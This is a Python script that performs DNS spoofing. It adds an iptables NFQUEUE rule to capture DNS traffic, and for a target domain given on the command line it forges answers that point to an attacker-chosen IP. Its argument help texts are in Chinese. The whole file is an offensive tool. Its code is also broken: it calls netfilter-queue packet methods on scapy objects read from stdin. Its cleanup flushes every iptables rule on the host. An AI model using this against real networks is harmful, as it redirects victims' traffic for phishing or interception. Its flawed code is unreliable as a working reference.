import argparse
import os
import socket

from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP



bannerText = """
                                                      
    """
def packageHandle(packet):
    payload = packet.get_payload()
    pkt = IP(payload)

    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        if domain.encode() in pkt[DNS].qd.qname:
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=targetIp))
            packet.set_payload(bytes(spoofed_pkt))
            packet.accept()
        else:
            packet.accept()

def main():
    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
    try:
        while True:
            data = os.read(0, 4096)
            packet = IP(data)
            packageHandle(packet)
    except KeyboardInterrupt:
        os.system('iptables -F')
        os.system('iptables -X')

if __name__ == '__main__':
    print(bannerText)

    parser = argparse.ArgumentParser("")
    parser.add_argument("-d", "--domain", help="目标域名", required=True)
    parser.add_argument("-t", "--target", help="虚假ips", required=True)

    args = parser.parse_args()
    targetIp = args.target
    domain = args.domain
    main()
